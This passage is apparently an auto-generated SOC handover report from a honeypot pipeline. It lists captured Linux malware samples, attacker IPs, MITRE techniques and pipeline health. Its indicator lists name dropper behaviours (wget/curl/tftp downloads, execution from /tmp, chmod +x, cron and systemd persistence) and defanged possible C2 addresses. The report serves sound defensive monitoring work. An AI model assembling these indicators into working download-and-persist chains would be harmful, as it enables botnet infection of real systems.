| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `80.94.92[.]234` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `107.150.146[.]69` | US | Internap Network Services Corporation | **100** ⚠️ | 0 |
| `138.226.239[.]234` | NL | Vlad Cojuhari | **100** ⚠️ | 19 |
| `195.178.110[.]218` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `167.233.164[.]13` | DE | Hetzner Online GmbH | **100** ⚠️ | 2 |
| `75.155.35[.]127` | CA | TELUS-FIBRE-CLGRAB01 | **100** ⚠️ | 2 |
| `45.14.109[.]143` | UA | EUROTELE-PLUS LLC | **100** ⚠️ | 2 |
| `138.226.239[.]233` | NL | Vlad Cojuhari | **100** ⚠️ | 4 |
| `77.90.185[.]20` | LT | Limited Network LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 98 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 96 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 11 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 11 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 9 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 130 cases |
| Tool 34  | Credential Extractor        | ✅ 405 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (7.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 96 priority case(s) shown individually · 9 recon entry/entries in table (5 group(s) consolidating 20 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-12T16:52:18Z_
